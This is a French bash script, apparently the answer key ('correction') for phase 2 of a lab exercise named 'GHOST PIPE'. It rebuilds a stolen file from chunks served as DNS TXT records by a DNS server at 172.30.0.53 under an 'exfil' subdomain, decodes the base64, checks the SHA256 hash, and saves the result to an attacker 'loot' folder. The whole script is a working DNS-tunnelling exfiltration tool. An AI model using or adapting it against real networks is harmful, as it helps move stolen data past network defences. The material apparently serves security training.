#!/bin/bash
# ==========================================================================
#  GHOST PIPE — Phase 2 : Extraction DNS (CORRECTION)
#  Usage : ./phase2-extract.sh [sous-domaine] [serveur-dns] [répertoire-sortie]
# ==========================================================================

set -euo pipefail

# ── Paramètres ──────────────────────────────────────────────────────────────
SUBDOMAIN="${1:-exfil}"
DNS_SERVER="${2:-172.30.0.53}"
OUTPUT_DIR="${3:-/home/attacker/loot}"
ZONE="corp.local"

echo "══════════════════════════════════════════════════"
echo "  GHOST PIPE — Extraction DNS TXT"
echo "══════════════════════════════════════════════════"
echo "[*] Serveur DNS   : $DNS_SERVER"
echo "[*] Zone          : $ZONE"
echo "[*] Sous-domaine  : $SUBDOMAIN"
echo "[*] Sortie        : $OUTPUT_DIR"

mkdir -p "$OUTPUT_DIR"

# ── Étape 1 : Récupération des métadonnées ─────────────────────────────────
echo ""
echo "[1/4] Récupération des métadonnées (chunk-000)..."

META_RAW=$(dig +short TXT "chunk-000.${SUBDOMAIN}.${ZONE}" @"$DNS_SERVER" | tr -d '"')

if [ -z "$META_RAW" ]; then
    echo "[!] Aucune métadonnée trouvée à chunk-000.${SUBDOMAIN}.${ZONE}"
    echo "    Vérifiez le sous-domaine et le serveur DNS."
    exit 1
fi

# Parsing des métadonnées : filename|nb_chunks|sha256|taille
IFS='|' read -r FILENAME NB_CHUNKS EXPECTED_HASH ORIG_SIZE <<< "$META_RAW"
echo "      Fichier     : $FILENAME"
echo "      Chunks      : $NB_CHUNKS"
echo "      SHA256 attendu : $EXPECTED_HASH"
echo "      Taille orig.   : $ORIG_SIZE octets"

# ── Étape 2 : Récupération de tous les chunks ──────────────────────────────
echo ""
echo "[2/4] Récupération des chunks de données..."

B64_DATA=""
ERRORS=0

for (( i=1; i<=NB_CHUNKS; i++ )); do
    CHUNK_NUM=$(printf "%03d" "$i")
    FQDN="chunk-${CHUNK_NUM}.${SUBDOMAIN}.${ZONE}"

    # Requête DNS TXT
    CHUNK=$(dig +short TXT "$FQDN" @"$DNS_SERVER" 2>/dev/null | tr -d '"')

    if [ -z "$CHUNK" ]; then
        echo "      [!] Chunk $CHUNK_NUM manquant !"
        ERRORS=$((ERRORS + 1))
    else
        B64_DATA="${B64_DATA}${CHUNK}"
        echo -ne "      [$CHUNK_NUM/$NB_CHUNKS] Récupéré\r"
    fi
done

echo ""

if [ $ERRORS -gt 0 ]; then
    echo "[!] $ERRORS chunk(s) manquant(s) — le fichier sera probablement corrompu."
fi

# ── Étape 3 : Décodage Base64 ──────────────────────────────────────────────
echo "[3/4] Décodage base64..."

OUTPUT_FILE="${OUTPUT_DIR}/${FILENAME}"
echo "$B64_DATA" | base64 -d > "$OUTPUT_FILE" 2>/dev/null
RESULT=$?

if [ $RESULT -ne 0 ]; then
    echo "[!] Erreur de décodage base64. Données corrompues ?"
    exit 1
fi

ACTUAL_SIZE=$(stat -c%s "$OUTPUT_FILE")
echo "      Fichier reconstruit : $OUTPUT_FILE ($ACTUAL_SIZE octets)"

# ── Étape 4 : Vérification d'intégrité ─────────────────────────────────────
echo "[4/4] Vérification d'intégrité SHA256..."

ACTUAL_HASH=$(sha256sum "$OUTPUT_FILE" | awk '{print $1}')

echo ""
echo "══════════════════════════════════════════════════"
if [ "$ACTUAL_HASH" = "$EXPECTED_HASH" ]; then
    echo "  ✅ EXTRACTION RÉUSSIE — Intégrité vérifiée"
else
    echo "  ⚠️  EXTRACTION TERMINÉE — Hash non concordant"
    echo "  Attendu : $EXPECTED_HASH"
    echo "  Obtenu  : $ACTUAL_HASH"
fi
echo "══════════════════════════════════════════════════"
echo "  Fichier : $OUTPUT_FILE"
echo "  Taille  : $ACTUAL_SIZE octets (attendu: $ORIG_SIZE)"
echo ""
echo "  Contenu :"
echo "  file $OUTPUT_FILE"
file "$OUTPUT_FILE"
echo "══════════════════════════════════════════════════"
